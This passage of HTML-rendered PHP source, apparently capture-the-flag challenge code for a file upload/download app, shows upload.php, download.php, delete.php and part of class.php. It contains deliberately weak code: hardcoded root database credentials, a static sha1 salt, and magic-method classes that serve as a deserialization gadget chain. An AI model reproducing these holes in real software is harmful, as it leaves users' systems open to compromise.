language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string">".gif"</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'image/gif'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string">".gif"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string">".jpg"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'image/png'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string">".png"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"Only gif/jpg/png allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$dst</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token variable">$fileext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$dst</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"Invaild filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>download.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>delete.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>class.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token 